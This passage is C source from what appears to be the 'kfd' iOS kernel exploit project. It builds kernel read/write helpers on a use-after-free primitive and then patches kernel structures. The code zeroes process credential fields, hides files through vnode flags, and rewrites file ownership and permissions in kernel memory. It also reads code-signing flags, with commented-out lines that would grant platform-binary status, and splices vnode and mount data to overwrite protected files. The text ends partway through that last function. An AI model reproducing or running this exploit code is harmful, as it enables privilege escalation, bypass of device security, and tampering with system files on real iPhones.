//
//  fun.c
//  kfd
//
//  Created by Seo Hyun-gyu on 2023/07/25.
//

#include "fun.h"
#include "libkfd.h"
#include "helpers.h"
#include <sys/stat.h>
#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <sys/mount.h>
#import "kfd-Bridging-Header.h"
#include <sys/stat.h>
#include <sys/attr.h>
#include <sys/snapshot.h>

struct hfs_mount_args {
    char    *fspec;            /* block special device to mount */
    uid_t    hfs_uid;        /* uid that owns hfs files (standard HFS only) */
    gid_t    hfs_gid;        /* gid that owns hfs files (standard HFS only) */
    mode_t    hfs_mask;        /* mask to be applied for hfs perms  (standard HFS only) */
    u_int32_t hfs_encoding;    /* encoding for this volume (standard HFS only) */
    struct    timezone hfs_timezone;    /* user time zone info (standard HFS only) */
    int        flags;            /* mounting flags, see below */
    int     journal_tbuffer_size;   /* size in bytes of the journal transaction buffer */
    int        journal_flags;          /* flags to pass to journal_open/create */
    int        journal_disable;        /* don't use journaling (potentially dangerous) */
};

uint64_t do_kopen(uint64_t puaf_pages, uint64_t puaf_method, uint64_t kread_method, uint64_t kwrite_method)
{
    return kopen(puaf_pages, puaf_method, kread_method, kwrite_method);
}

void do_kclose(u64 kfd)
{
    kclose((struct kfd*)(kfd));
}

void do_respring()
{
    respringFrontboard();
}

uint8_t kread8(u64 kfd, uint64_t where) {
    uint8_t out;
    kread(kfd, where, &out, sizeof(uint8_t));
    return out;
}

uint32_t kread16(u64 kfd, uint64_t where) {
    uint16_t out;
    kread(kfd, where, &out, sizeof(uint16_t));
    return out;
}

uint32_t kread32(u64 kfd, uint64_t where) {
    uint32_t out;
    kread(kfd, where, &out, sizeof(uint32_t));
    return out;
}
uint64_t kread64(u64 kfd, uint64_t where) {
    uint64_t out;
    kread(kfd, where, &out, sizeof(uint64_t));
    return out;
}

//kptr_t kapi_read_kptr(u64 kfd, kptr_t addr) {
//    uint64_t v = kread64(kfd, addr);
//    return (kptr_t)v;
//}

void kwrite8(u64 kfd, uint64_t where, uint8_t what) {
    uint8_t _buf[8] = {};
    _buf[0] = what;
    _buf[1] = kread8(kfd, where+1);
    _buf[2] = kread8(kfd, where+2);
    _buf[3] = kread8(kfd, where+3);
    _buf[4] = kread8(kfd, where+4);
    _buf[5] = kread8(kfd, where+5);
    _buf[6] = kread8(kfd, where+6);
    _buf[7] = kread8(kfd, where+7);
    kwrite((u64)(kfd), &_buf, where, sizeof(u64));
}

void kwrite16(u64 kfd, uint64_t where, uint16_t what) {
    u16 _buf[4] = {};
    _buf[0] = what;
    _buf[1] = kread16(kfd, where+2);
    _buf[2] = kread16(kfd, where+4);
    _buf[3] = kread16(kfd, where+6);
    kwrite((u64)(kfd), &_buf, where, sizeof(u64));
}

void kwrite32(u64 kfd, uint64_t where, uint32_t what) {
    u32 _buf[2] = {};
    _buf[0] = what;
    _buf[1] = kread32(kfd, where+4);
    kwrite((u64)(kfd), &_buf, where, sizeof(u64));
}

void kwrite64(u64 kfd, uint64_t where, uint64_t what) {
    u64 _buf[1] = {};
    _buf[0] = what;
    kwrite((u64)(kfd), &_buf, where, sizeof(u64));
}


uint64_t getProc(u64 kfd, pid_t pid) {
    uint64_t proc = ((struct kfd*)kfd)->info.kaddr.kernel_proc;
    
    while (true) {
        if(kread32(kfd, proc + 0x60/*PROC_P_PID_OFF*/) == pid) {
            return proc;
        }
        proc = kread64(kfd, proc + 0x8/*PROC_P_LIST_LE_PREV_OFF*/);
    }
    
    return 0;
}

uint64_t getProcByName(u64 kfd, char* nm) {
    uint64_t proc = ((struct kfd*)kfd)->info.kaddr.kernel_proc;
    
    while (true) {
        uint64_t nameptr = proc + 0x381;//PROC_P_NAME_OFF; probably the problem
        char name[32];
        kread(kfd, nameptr, &name, 32);
        printf("[i] pid: %d, process name: %s\n", kread32(kfd, proc + 0x60), name);
        if(strcmp(name, nm) == 0) {
            return proc;
        }
        proc = kread64(kfd, proc + 0x8);//PROC_P_LIST_LE_PREV_OFF);
    }
    
    return 0;
}

int getPidByName(u64 kfd, char* nm) {
    print("function: getPidByName");
//    printf("%s", getProcByName(kfd, "tccd"));
    return kread32(kfd, getProcByName(kfd, nm) + 0x60);//PROC_P_PID_OFF);
}

int funProc(u64 kfd, uint64_t proc) {
    int p_ppid = kread32(kfd, proc + 0x20);
    printf("[i] self proc->p_ppid: %d\n", p_ppid);
    printf("[i] Patching proc->p_ppid %d -> 1 (for testing kwrite32)\n", p_ppid);
    kwrite32(kfd, proc + 0x20, 0x1);
    printf("getppid(): %u\n", getppid());
    kwrite32(kfd, proc + 0x20, p_ppid);

    int p_original_ppid = kread32(kfd, proc + 0x24);
    printf("[i] self proc->p_original_ppid: %d\n", p_original_ppid);
    
    int p_pgrpid = kread32(kfd, proc + 0x28);
    printf("[i] self proc->p_pgrpid: %d\n", p_pgrpid);
    
    kwrite32(kfd, proc + 0x2c, 0x0);
    kwrite32(kfd, proc + 0x30, 0x0);
    kwrite32(kfd, proc + 0x34, 0x0);
    kwrite32(kfd, proc + 0x38, 0x0);
    kwrite32(kfd, proc + 0x3c, 0x0);
    kwrite32(kfd, proc + 0x40, 0x0);
    kwrite32(kfd, proc + 0x44, 0x0);
    kwrite32(kfd, proc + 0x48, 0x0);
    
    int p_uid = kread32(kfd, proc + 0x2c);
    printf("[i] self proc->p_uid: %d\n", p_uid);
    
    int p_gid = kread32(kfd, proc + 0x30);
    printf("[i] self proc->p_gid: %d\n", p_gid);
    
    int p_ruid = kread32(kfd, proc + 0x34);
    printf("[i] self proc->p_ruid: %d\n", p_ruid);
    
    int p_rgid = kread32(kfd, proc + 0x38);
    printf("[i] self proc->p_rgid: %d\n", p_rgid);
    
    int p_svuid = kread32(kfd, proc + 0x3c);
    printf("[i] self proc->p_svuid: %d\n", p_svuid);
    
    int p_svgid = kread32(kfd, proc + 0x40);
    printf("[i] self proc->p_svgid: %d\n", p_svgid);
    
    int p_sessionid = kread32(kfd, proc + 0x44);
    printf("[i] self proc->p_sessionid: %d\n", p_sessionid);
    
    uint64_t p_puniqueid = kread64(kfd, proc + 0x48);
    printf("[i] self proc->p_puniqueid: 0x%llx\n", p_puniqueid);
    
    printf("[i] Patching proc->p_puniqueid 0x%llx -> 0x4142434445464748 (for testing kwrite64)\n", p_puniqueid);
    kwrite64(kfd, proc+0x48, 0x0);
    printf("[i] self proc->p_puniqueid: 0x%llx\n", kread64(kfd, proc + 0x48));
    kwrite64(kfd, proc+0x48, p_puniqueid);
    
    return 0;
}

int funUcred(u64 kfd, uint64_t proc) {
    uint64_t proc_ro = kread64(kfd, proc + 0x18);
    uint64_t ucreds = kread64(kfd, proc_ro + 0x20);
    
    uint64_t cr_label_pac = kread64(kfd, ucreds + 0x78);
    uint64_t cr_label = cr_label_pac | 0xffffff8000000000;
    printf("[i] self ucred->cr_label: 0x%llx\n", cr_label);
    
    uint64_t cr_posix_p = ucreds + 0x18;
    printf("[i] self ucred->posix_cred->cr_uid: %u\n", kread32(kfd, cr_posix_p + 0));
    printf("[i] self ucred->posix_cred->cr_ruid: %u\n", kread32(kfd, cr_posix_p + 4));
    printf("[i] self ucred->posix_cred->cr_svuid: %u\n", kread32(kfd, cr_posix_p + 8));
    printf("[i] self ucred->posix_cred->cr_ngroups: %u\n", kread32(kfd, cr_posix_p + 0xc));
    printf("[i] self ucred->posix_cred->cr_groups: %u\n", kread32(kfd, cr_posix_p + 0x10));
    printf("[i] self ucred->posix_cred->cr_rgid: %u\n", kread32(kfd, cr_posix_p + 0x50));
    printf("[i] self ucred->posix_cred->cr_svgid: %u\n", kread32(kfd, cr_posix_p + 0x54));
    printf("[i] self ucred->posix_cred->cr_gmuid: %u\n", kread32(kfd, cr_posix_p + 0x58));
    printf("[i] self ucred->posix_cred->cr_flags: %u\n", kread32(kfd, cr_posix_p + 0x5c));
    
//    sleep(3);
//    kwrite32(kfd, cr_posix_p+0, 501);
//    printf("[i] self ucred->posix_cred->cr_uid: %u\n", kread32(kfd, cr_posix_p + 0));
    
//    kwrite64(kfd, cr_posix_p+0, 0);
//    kwrite64(kfd, cr_posix_p+8, 0);
//    kwrite64(kfd, cr_posix_p+16, 0);
//    kwrite64(kfd, cr_posix_p+24, 0);
//    kwrite64(kfd, cr_posix_p+32, 0);
//    kwrite64(kfd, cr_posix_p+40, 0);
//    kwrite64(kfd, cr_posix_p+48, 0);
//    kwrite64(kfd, cr_posix_p+56, 0);
//    kwrite64(kfd, cr_posix_p+64, 0);
//    kwrite64(kfd, cr_posix_p+72, 0);
//    kwrite64(kfd, cr_posix_p+80, 0);
//    kwrite64(kfd, cr_posix_p+88, 0);
    
//    setgroups(0, 0);
    return 0;
}

uint64_t funVnodeHide(u64 kfd, char* filename) {
    //16.1.2 offsets
    uint32_t off_p_pfd = 0xf8;
    uint32_t off_fd_ofiles = 0;
    uint32_t off_fp_fglob = 0x10;
    uint32_t off_fg_data = 0x38;
    uint32_t off_vnode_iocount = 0x64;
    uint32_t off_vnode_usecount = 0x60;
    uint32_t off_vnode_vflags = 0x54;
    
    int file_index = open(filename, O_RDONLY);
    if (file_index == -1) return -1;
    
    uint64_t proc = getProc(kfd, getpid());
    
    //get vnode
    uint64_t filedesc_pac = kread64(kfd, proc + off_p_pfd);
    uint64_t filedesc = filedesc_pac | 0xffffff8000000000;
    uint64_t openedfile = kread64(kfd, filedesc + (8 * file_index));
    uint64_t fileglob_pac = kread64(kfd, openedfile + off_fp_fglob);
    uint64_t fileglob = fileglob_pac | 0xffffff8000000000;
    uint64_t vnode_pac = kread64(kfd, fileglob + off_fg_data);
    uint64_t vnode = vnode_pac | 0xffffff8000000000;
    printf("[i] vnode: 0x%llx\n", vnode);
    
    //vnode_ref, vnode_get
    uint32_t usecount = kread32(kfd, vnode + off_vnode_usecount);
    uint32_t iocount = kread32(kfd, vnode + off_vnode_iocount);
    printf("[i] vnode->usecount: %d, vnode->iocount: %d\n", usecount, iocount);
    kwrite32(kfd, vnode + off_vnode_usecount, usecount + 1);
    kwrite32(kfd, vnode + off_vnode_iocount, iocount + 1);
    
#define VISSHADOW 0x008000
    //hide file
    uint32_t v_flags = kread32(kfd, vnode + off_vnode_vflags);
    printf("[i] vnode->v_flags: 0x%x\n", v_flags);
    kwrite32(kfd, vnode + off_vnode_vflags, (v_flags | VISSHADOW));

    //exist test (should not be exist
    printf("[i] %s access ret: %d\n", filename, access(filename, F_OK));
    
//    //show file
//    v_flags = kread32(kfd, vnode + off_vnode_vflags);
//    kwrite32(kfd, vnode + off_vnode_vflags, (v_flags &= ~VISSHADOW));
    
    printf("[i] %s access ret: %d\n", filename, access(filename, F_OK));
    
    close(file_index);
    
    //restore vnode iocount, usecount
    usecount = kread32(kfd, vnode + off_vnode_usecount);
    iocount = kread32(kfd, vnode + off_vnode_iocount);
    if(usecount > 0)
        kwrite32(kfd, vnode + off_vnode_usecount, usecount - 1);
    if(iocount > 0)
        kwrite32(kfd, vnode + off_vnode_iocount, iocount - 1);

    return 0;
}

uint64_t funVnodeChown(u64 kfd, char* filename, uid_t uid, gid_t gid) {
    uint32_t off_p_pfd = 0xf8;
    uint32_t off_vnode_v_data = 0xe0;
    uint32_t off_fp_fglob = 0x10;
    uint32_t off_fg_data = 0x38;
    
    int file_index = open(filename, O_RDONLY);
    if (file_index == -1) return -1;
    
    uint64_t proc = getProc(kfd, getpid());
    
    //get vnode
    uint64_t filedesc_pac = kread64(kfd, proc + off_p_pfd);
    uint64_t filedesc = filedesc_pac | 0xffffff8000000000;
    uint64_t openedfile = kread64(kfd, filedesc + (8 * file_index));
    uint64_t fileglob_pac = kread64(kfd, openedfile + off_fp_fglob);
    uint64_t fileglob = fileglob_pac | 0xffffff8000000000;
    uint64_t vnode_pac = kread64(kfd, fileglob + off_fg_data);
    uint64_t vnode = vnode_pac | 0xffffff8000000000;
    uint64_t v_data = kread64(kfd, vnode + off_vnode_v_data);
    uint32_t v_uid = kread32(kfd, v_data + 0x80);
    uint32_t v_gid = kread32(kfd, v_data + 0x84);
    
    //vnode->v_data->uid
    printf("[i] Patching %s vnode->v_uid %d -> %d\n", filename, v_uid, uid);
    kwrite32(kfd, v_data+0x80, uid);
    //vnode->v_data->gid
    printf("[i] Patching %s vnode->v_gid %d -> %d\n", filename, v_gid, gid);
    kwrite32(kfd, v_data+0x84, gid);
    
    close(file_index);
    
    struct stat file_stat;
    if(stat(filename, &file_stat) == 0) {
        printf("[i] %s UID: %d\n", filename, file_stat.st_uid);
        printf("[i] %s GID: %d\n", filename, file_stat.st_gid);
    }
    
    return 0;
}

uint64_t funVnodeChmod(u64 kfd, char* filename, mode_t mode) {
    uint32_t off_p_pfd = 0xf8;
    uint32_t off_vnode_v_data = 0xe0;
    uint32_t off_fp_fglob = 0x10;
    uint32_t off_fg_data = 0x38;
    
    int file_index = open(filename, O_RDONLY);
    if (file_index == -1) return -1;
    
    uint64_t proc = getProc(kfd, getpid());

    uint64_t filedesc_pac = kread64(kfd, proc + off_p_pfd);
    uint64_t filedesc = filedesc_pac | 0xffffff8000000000;
    uint64_t openedfile = kread64(kfd, filedesc + (8 * file_index));
    uint64_t fileglob_pac = kread64(kfd, openedfile + off_fp_fglob);
    uint64_t fileglob = fileglob_pac | 0xffffff8000000000;
    uint64_t vnode_pac = kread64(kfd, fileglob + off_fg_data);
    uint64_t vnode = vnode_pac | 0xffffff8000000000;
    uint64_t v_data = kread64(kfd, vnode + off_vnode_v_data);
    uint32_t v_mode = kread32(kfd, v_data + 0x88);
    
    close(file_index);
    
    printf("[i] Patching %s vnode->v_mode %o -> %o\n", filename, v_mode, mode);
    kwrite32(kfd, v_data+0x88, mode);
    
    struct stat file_stat;
    if(stat(filename, &file_stat) == 0) {
        printf("[i] %s mode: %o\n", filename, file_stat.st_mode);
    }
    
    return 0;
}

int funCSFlags(u64 kfd, char* process) {
    uint64_t pid = getPidByName(kfd, process);
    uint64_t proc = getProc(kfd, pid);

    uint64_t proc_ro = kread64(kfd, proc + 0x18);
    uint32_t csflags = kread32(kfd, proc_ro + 0x1C);
    printf("[i] %s proc->proc_ro->csflags: 0x%x\n", process, csflags);

#define TF_PLATFORM 0x400

#define CS_GET_TASK_ALLOW    0x0000004    /* has get-task-allow entitlement */
#define CS_INSTALLER        0x0000008    /* has installer entitlement */

#define    CS_HARD            0x0000100    /* don't load invalid pages */
#define    CS_KILL            0x0000200    /* kill process if it becomes invalid */
#define CS_RESTRICT        0x0000800    /* tell dyld to treat restricted */

#define CS_PLATFORM_BINARY    0x4000000    /* this is a platform binary */

#define CS_DEBUGGED         0x10000000  /* process is currently or has previously been debugged and allowed to run with invalid pages */

//    csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW | CS_DEBUGGED) & ~(CS_RESTRICT | CS_HARD | CS_KILL);
//    sleep(3);
//    kwrite32(kfd, proc_ro + 0x1c, csflags);

    return 0;
}

int funTask(u64 kfd, char* process) {
    uint64_t pid = getPidByName(kfd, process);
    uint64_t proc = getProc(kfd, pid);
    printf("[i] %s proc: 0x%llx\n", process, proc);
    uint64_t proc_ro = kread64(kfd, proc + 0x18);

    uint64_t pr_proc = kread64(kfd, proc_ro + 0x0);
    printf("[i] %s proc->proc_ro->pr_proc: 0x%llx\n", process, pr_proc);

    uint64_t pr_task = kread64(kfd, proc_ro + 0x8);
    printf("[i] %s proc->proc_ro->pr_task: 0x%llx\n", process, pr_task);

    //proc_is64bit_data+0x18: LDR             W8, [X8,#0x3D0]
    uint32_t t_flags = kread32(kfd, pr_task + 0x3D0);
    printf("[i] %s task->t_flags: 0x%x\n", process, t_flags);


    /*
     * RO-protected flags:
     */
    #define TFRO_PLATFORM                   0x00000400                      /* task is a platform binary */
    #define TFRO_FILTER_MSG                 0x00004000                      /* task calls into message filter callback before sending a message */
    #define TFRO_PAC_EXC_FATAL              0x00010000                      /* task is marked a corpse if a PAC exception occurs */
    #define TFRO_PAC_ENFORCE_USER_STATE     0x01000000                      /* Enforce user and kernel signed thread state */
    uint32_t t_flags_ro = kread64(kfd, proc_ro + 0x78);
    printf("[i] %s proc->proc_ro->t_flags_ro: 0x%x\n", process, t_flags_ro);

    return 0;
}

uint64_t funVnodeOverwriteFile(u64 kfd, char* to, char* from) {
    //16.1.2 offsets
    uint32_t off_p_pfd = 0xf8;
    uint32_t off_fd_ofiles = 0;
    uint32_t off_fp_fglob = 0x10;
    uint32_t off_fg_data = 0x38;
    uint32_t off_vnode_iocount = 0x64;
    uint32_t off_vnode_usecount = 0x60;
    uint32_t off_vnode_vflags = 0x54;
    uint32_t off_vnode_v_mount = 0xd8;
    uint32_t off_vnode_v_data = 0xe0;
    uint32_t off_vnode_v_kusecount = 0x5c;
    uint32_t off_vnode_v_references = 0x5b;
    uint32_t off_vnode_v_parent = 0xc0;
    uint32_t off_vnode_v_label = 0xe8;
    uint32_t off_vnode_v_cred = 0x98;
    uint32_t off_mount_mnt_data = 0x11F;
    uint32_t off_mount_mnt_fsowner = 0x9c0;
    uint32_t off_mount_mnt_fsgroup = 0x9c4;
    
    int file_index = open(to, O_RDONLY);
    if (file_index == -1) return -1;
    
    uint64_t proc = getProc(kfd, getpid());
    
    //get vnode
    uint64_t filedesc_pac = kread64(kfd, proc + off_p_pfd);
    uint64_t filedesc = filedesc_pac | 0xffffff8000000000;
    uint64_t openedfile = kread64(kfd, filedesc + (8 * file_index));
    uint64_t fileglob_pac = kread64(kfd, openedfile + off_fp_fglob);
    uint64_t fileglob = fileglob_pac | 0xffffff8000000000;
    uint64_t vnode_pac = kread64(kfd, fileglob + off_fg_data);
    uint64_t to_vnode = vnode_pac | 0xffffff8000000000;
    printf("[i] %s to_vnode: 0x%llx\n", to, to_vnode);
    
    uint64_t to_v_mount_pac = kread64(kfd, to_vnode + off_vnode_v_mount);
    uint64_t to_v_mount = to_v_mount_pac | 0xffffff8000000000;
    printf("[i] %s to_vnode->v_mount: 0x%llx\n", to, to_v_mount);
    uint64_t to_v_data = kread64(kfd, to_vnode + off_vnode_v_data);
    printf("[i] %s to_vnode->v_data: 0x%llx\n", from, to_v_data);
    uint64_t to_v_label = kread64(kfd, to_vnode + off_vnode_v_label);
    printf("[i] %s to_vnode->v_label: 0x%llx\n", to, to_v_label);
    
    uint8_t to_v_references = kread8(kfd, to_vnode + off_vnode_v_references);
    printf("[i] %s to_vnode->v_references: %d\n", to, to_v_references);
    uint32_t to_usecount = kread32(kfd, to_vnode + off_vnode_usecount);
    printf("[i] %s to_vnode->usecount: %d\n", to, to_usecount);
    uint32_t to_iocount = kread32(kfd, to_vnode + off_vnode_iocount);
    printf("[i] %s to_vnode->iocount: %d\n", to, to_iocount);
    uint32_t to_v_kusecount = kread32(kfd, to_vnode + off_vnode_v_kusecount);
    printf("[i] %s to_vnode->kusecount: %d\n", to, to_v_kusecount);
    uint64_t to_v_parent_pac = kread64(kfd, to_vnode + off_vnode_v_parent);
    uint64_t to_v_parent = to_v_parent_pac | 0xffffff8000000000;
    printf("[i] %s to_vnode->v_parent: 0x%llx\n", to, to_v_parent);
    uint64_t to_v_freelist_tqe_next = kread64(kfd, to_vnode + 0x10); //v_freelist.tqe_next
    printf("[i] %s to_vnode->v_freelist.tqe_next: 0x%llx\n", to, to_v_freelist_tqe_next);
    uint64_t to_v_freelist_tqe_prev = kread64(kfd, to_vnode + 0x18); //v_freelist.tqe_prev
    printf("[i] %s to_vnode->v_freelist.tqe_prev: 0x%llx\n", to, to_v_freelist_tqe_prev);
    uint64_t to_v_mntvnodes_tqe_next = kread64(kfd, to_vnode + 0x20);   //v_mntvnodes.tqe_next
    printf("[i] %s to_vnode->v_mntvnodes.tqe_next: 0x%llx\n", to, to_v_mntvnodes_tqe_next);
    uint64_t to_v_mntvnodes_tqe_prev = kread64(kfd, to_vnode + 0x28);  //v_mntvnodes.tqe_prev
    printf("[i] %s to_vnode->v_mntvnodes.tqe_prev: 0x%llx\n", to, to_v_mntvnodes_tqe_prev);
    uint64_t to_v_ncchildren_tqh_first = kread64(kfd, to_vnode + 0x30);
    printf("[i] %s to_vnode->v_ncchildren.tqh_first: 0x%llx\n", to, to_v_ncchildren_tqh_first);
    uint64_t to_v_ncchildren_tqh_last = kread64(kfd, to_vnode + 0x38);
    printf("[i] %s to_vnode->v_ncchildren.tqh_last: 0x%llx\n", to, to_v_ncchildren_tqh_last);
    uint64_t to_v_nclinks_lh_first = kread64(kfd, to_vnode + 0x40);
    printf("[i] %s to_vnode->v_nclinks.lh_first: 0x%llx\n", to, to_v_nclinks_lh_first);
    uint64_t to_v_defer_reclaimlist = kread64(kfd, to_vnode + 0x48);    //v_defer_reclaimlist
    printf("[i] %s to_vnode->v_defer_reclaimlist: 0x%llx\n", to, to_v_defer_reclaimlist);
    uint32_t to_v_listflag = kread32(kfd, to_vnode + 0x50);    //v_listflag
    printf("[i] %s to_vnode->v_listflag: 0x%x\n", to, to_v_listflag);
    uint64_t to_v_cred_pac = kread64(kfd, to_vnode + off_vnode_v_cred);
    uint64_t to_v_cred = to_v_cred_pac | 0xffffff8000000000;
    printf("[i] %s to_vnode->v_cred: 0x%llx\n", to, to_v_cred);
    
    uint32_t to_m_fsowner = kread32(kfd, to_v_mount + off_mount_mnt_fsowner);
    printf("[i] %s to_vnode->v_mount->mnt_fsowner: %d\n", to, to_m_fsowner);
    uint32_t to_m_fsgroup = kread32(kfd, to_v_mount + off_mount_mnt_fsgroup);
    printf("[i] %s to_vnode->v_mount->mnt_fsgroup: %d\n", to, to_m_fsgroup);
    
    
    close(file_index);
    
    file_index = open(from, O_RDONLY);
    if (file_index == -1) return -1;
    
    //get vnode
    filedesc_pac = kread64(kfd, proc + off_p_pfd);
    filedesc = filedesc_pac | 0xffffff8000000000;
    openedfile = kread64(kfd, filedesc + (8 * file_index));
    fileglob_pac = kread64(kfd, openedfile + off_fp_fglob);
    fileglob = fileglob_pac | 0xffffff8000000000;
    vnode_pac = kread64(kfd, fileglob + off_fg_data);
    uint64_t from_vnode = vnode_pac | 0xffffff8000000000;
    printf("[i] %s from_vnode: 0x%llx\n", from, from_vnode);
    
    
    
    uint64_t from_v_mount_pac = kread64(kfd, from_vnode + off_vnode_v_mount);
    uint64_t from_v_mount = from_v_mount_pac | 0xffffff8000000000;
    printf("[i] %s from_vnode->v_mount: 0x%llx\n", from, from_v_mount);
    uint64_t from_v_data = kread64(kfd, from_vnode + off_vnode_v_data);
    printf("[i] %s from_vnode->v_data: 0x%llx\n", from, from_v_data);
    uint64_t from_v_label = kread64(kfd, from_vnode + off_vnode_v_label);
    printf("[i] %s from_vnode->v_label: 0x%llx\n", from, from_v_label);
    uint8_t from_v_references = kread8(kfd, from_vnode + off_vnode_v_references);
    printf("[i] %s from_vnode->v_references: %d\n", from, from_v_references);
    uint32_t from_usecount = kread32(kfd, from_vnode + off_vnode_usecount);
    printf("[i] %s from_vnode->usecount: %d\n", from, from_usecount);
    uint32_t from_iocount = kread32(kfd, from_vnode + off_vnode_iocount);
    printf("[i] %s from_vnode->iocount: %d\n", from, from_iocount);
    uint32_t from_v_kusecount = kread32(kfd, from_vnode + off_vnode_v_kusecount);
    printf("[i] %s from_vnode->kusecount: %d\n", from, from_v_kusecount);
    uint64_t from_v_parent_pac = kread64(kfd, from_vnode + off_vnode_v_parent);
    uint64_t from_v_parent = from_v_parent_pac | 0xffffff8000000000;
    printf("[i] %s from_vnode->v_parent: 0x%llx\n", from, from_v_parent);
    uint64_t from_v_freelist_tqe_next = kread64(kfd, from_vnode + 0x10); //v_freelist.tqe_next
    printf("[i] %s from_vnode->v_freelist.tqe_next: 0x%llx\n", from, from_v_freelist_tqe_next);
    uint64_t from_v_freelist_tqe_prev = kread64(kfd, from_vnode + 0x18); //v_freelist.tqe_prev
    printf("[i] %s from_vnode->v_freelist.tqe_prev: 0x%llx\n", from, from_v_freelist_tqe_prev);
    uint64_t from_v_mntvnodes_tqe_next = kread64(kfd, from_vnode + 0x20);   //v_mntvnodes.tqe_next
    printf("[i] %s from_vnode->v_mntvnodes.tqe_next: 0x%llx\n", from, from_v_mntvnodes_tqe_next);
    uint64_t from_v_mntvnodes_tqe_prev = kread64(kfd, from_vnode + 0x28);  //v_mntvnodes.tqe_prev
    printf("[i] %s from_vnode->v_mntvnodes.tqe_prev: 0x%llx\n", from, from_v_mntvnodes_tqe_prev);
    uint64_t from_v_ncchildren_tqh_first = kread64(kfd, from_vnode + 0x30);
    printf("[i] %s from_vnode->v_ncchildren.tqh_first: 0x%llx\n", from, from_v_ncchildren_tqh_first);
    uint64_t from_v_ncchildren_tqh_last = kread64(kfd, from_vnode + 0x38);
    printf("[i] %s from_vnode->v_ncchildren.tqh_last: 0x%llx\n", from, from_v_ncchildren_tqh_last);
    uint64_t from_v_nclinks_lh_first = kread64(kfd, from_vnode + 0x40);
    printf("[i] %s from_vnode->v_nclinks.lh_first: 0x%llx\n", from, from_v_nclinks_lh_first);
    uint64_t from_v_defer_reclaimlist = kread64(kfd, from_vnode + 0x48);    //v_defer_reclaimlist
    printf("[i] %s from_vnode->v_defer_reclaimlist: 0x%llx\n", from, from_v_defer_reclaimlist);
    uint32_t from_v_listflag = kread32(kfd, from_vnode + 0x50);    //v_listflag
    printf("[i] %s from_vnode->v_listflag: 0x%x\n", from, from_v_listflag);
    uint64_t from_v_cred_pac = kread64(kfd, from_vnode + off_vnode_v_cred);
    uint64_t from_v_cred = from_v_cred_pac | 0xffffff8000000000;
    printf("[i] %s from_vnode->v_cred: 0x%llx\n", from, from_v_cred);
    
//    close(file_index);
    
    sleep(1);
    
    //mnt_devvp
    kwrite64(kfd, to_v_mount + 0x980, kread64(kfd, from_v_mount + 0x980));
    //mnt_data
//    kwrite64(kfd, to_v_mount + 0x8f8, kread64(kfd, from_v_mount + 0x8f8));
    //mnt_kern_flag
    kwrite32(kfd, to_v_mount + 0x74, kread32(kfd, from_v_mount + 0x74));
    //mnt_vfsstat
    uint64_t from_m_vfsstat = from_v_mount + 0x84;
    uint64_t to_m_vfsstat = to_v_mount + 0x84;
    kwrite32(kfd, to_m_vfsstat, kread32(kfd, from_m_vfsstat));
    kwrite32(kfd, to_m_vfsstat + 0x4, kread32(kfd, from_m_vfsstat + 0x4));
    kwrite64(kfd, to_m_vfsstat + 0x8, kread32(kfd, from_m_vfsstat + 0x8));
    kwrite64(kfd, to_m_vfsstat + 0x10, kread32(kfd, from_m_vfsstat + 0x10));
    kwrite64(kfd, to_m_vfsstat + 0x18, kread32(kfd, from_m_vfsstat + 0x18));
    kwrite64(kfd, to_m_vfsstat + 0x20, kread32(kfd, from_m_vfsstat + 0x20));
    kwrite64(kfd, to_m_vfsstat + 0x28, kread32(kfd, from_m_vfsstat + 0x28));
    kwrite64(kfd, to_m_vfsstat + 0x30, kread32(kfd, from_m_vfsstat + 0x30));
    
    //mnt_flag
    uint32_t from_m_flag = kread32(kfd, from_v_mount + 0x70);
    uint32_t to_m_flag = kread32(kfd, to_v_mount + 0x70);
    
    kwrite64(kfd, to_vnode + 0x20, from_v_mntvnodes_tqe_next);
    kwrite64(kfd, to_vnode + 0x28, from_v_mntvnodes_tqe_prev);
    
#define VISHARDLINK     0x100000
#define MNT_RDONLY      0x00000001
    kwrite32(kfd, to_vnode+off_vnode_vflags, kread32(kfd, to_vnode+off_vnode_vflags) & (~(0x1<<6)));
//    kwrite32(kfd, to_v_mount + 0x70, to_m_flag & (~(0x1<<6)));
    
    printf("from_m_flag: 0x%x, to_m_flag: 0x%lx\n", from_m_flag, to_m_flag);
    
    
//    uint32_t* p_bsize = (uint32_t*)((uintptr_t)&vfs + 0);
//        size_t* p_iosize = (size_t*)((uintptr_t)&vfs + 4);
//        uint64_t* p_blocks = (uint64_t*)((uintptr_t)&vfs + 8);
//        uint64_t* p_bfree = (uint64_t*)((uintptr_t)&vfs + 16);
//        uint64_t* p_bavail = (uint64_t*)((uintptr_t)&vfs + 24);
//        uint64_t* p_bused = (uint64_t*)((uintptr_t)&vfs + 32);
//        uint64_t* p_files = (uint64_t*)((uintptr_t)&vfs + 40);
//        uint64_t* p_ffree = (uint64_t*)((uintptr_t)&vfs + 48);
    
//    kwrite64(kfd, to_vnode + off_vnode_v_data, 0);
//    sleep(1);
    kwrite64(kfd, to_vnode + off_vnode_v_data, from_v_data);
//    kwrite64(kfd, to_v_data + 0x10, kread64(kfd, from_v_data + 0x10));
//    kwrite64(kfd, to_v_data + 0x18, kread64(kfd, from_v_data + 0x18));
//    kwrite64(kfd, to_v_data + 0x20, kread64(kfd, from_v_data + 0x20));
//    kwrite64(kfd, to_v_data + 0x30, kread64(kfd, from_v_data + 0x30));
//    kwrite64(kfd, to_v_data + 0xc0, kread64(kfd, from_v_data + 0xc0));
//    kwrite64(kfd, to_v_data + 0x130, kread64(kfd, from_v_data + 0x130));
//    kwrite64(kfd, to_v_data + 0x148, kread64(kfd, from_v_data + 0x148));
//    kwrite64(kfd, to_v_data + 0x150, kread64(kfd, from_v_data + 0x150));
//    kwrite64(kfd, to_v_data + 0x1b8, kread64(kfd, from_v_data + 0x1b8));
//    kwrite64(kfd, to_v_data + 0x1c0, kread64(kfd, from_v_data + 0x1c0));
//    kwrite64(kfd, to_v_data + 0x1d0, kread64(kfd, from_v_data + 0x1d0));
    
//    kwrite64(kfd, to_v_data + 0x20, kread64(kfd, from_v_data+0x20));
    
//        kwrite32(kfd, to_vnode + off_vnode_iocount, from_usecount + 1);

    kwrite32(kfd, to_vnode + off_vnode_usecount, to_usecount + 1);
    kwrite32(kfd, to_vnode + off_vnode_v_kusecount, to_v_kusecount + 1);
    kwrite8(kfd, to_vnode + off_vnode_v_references, to_v_references + 1);

//        kwrite64(kfd, to_vnode + 0x10, from_v_freelist_tqe_next);
//        kwrite64(kfd, to_vnode + 0x18, from_v_freelist_tqe_prev);
